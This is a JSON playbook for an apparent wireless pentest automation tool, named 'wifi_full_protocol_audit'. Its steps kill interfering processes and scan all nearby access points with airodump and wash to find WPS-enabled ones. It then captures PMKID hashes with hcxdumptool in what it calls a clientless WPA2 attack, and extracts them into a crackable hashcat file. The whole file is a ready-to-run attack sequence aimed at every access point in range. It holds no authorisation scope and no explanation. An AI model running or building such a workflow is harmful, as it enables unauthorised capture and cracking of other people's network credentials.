{
    "name": "wifi_full_protocol_audit",
    "description": "Complete wireless protocol audit: scan all APs, detect WPS/WEP/WPA2/WPA3, attack each with the appropriate method",
    "author": "JAMES",
    "version": "1.0",
    "category": "wifi",
    "tags": ["wps", "wep", "wpa2", "wpa3", "audit", "comprehensive"],
    "requires": ["aircrack-ng", "reaver", "wash", "hcxdumptool", "iw"],
    "variables": {
        "interface": "monitor-mode interface (e.g. wlan0mon)"
    },
    "steps": [
        {
            "tool": "aircrack",
            "action": "check_kill",
            "description": "Kill interfering processes"
        },
        {
            "tool": "aircrack",
            "action": "start_airodump",
            "params": {"interface": "{{interface}}", "write_prefix": "/tmp/full_audit"},
            "description": "Scan all nearby access points (15s)",
            "background": true,
            "duration": 15
        },
        {
            "tool": "reaver",
            "action": "wash_scan",
            "params": {"interface": "{{interface}}", "timeout": 15},
            "description": "Detect WPS-enabled APs"
        },
        {
            "tool": "hcxtools",
            "action": "capture_pmkid",
            "params": {"interface": "{{interface}}", "output_pcapng": "/tmp/full_audit_pmkid.pcapng", "timeout": 30},
            "description": "Capture PMKID hashes (clientless WPA2 attack)"
        },
        {
            "tool": "hcxtools",
            "action": "extract_hashes",
            "params": {"pcapng_file": "/tmp/full_audit_pmkid.pcapng", "output_hash_file": "/tmp/full_audit.hc22000"},
            "description": "Extract crackable hashes from PMKID capture"
        }
    ]
}
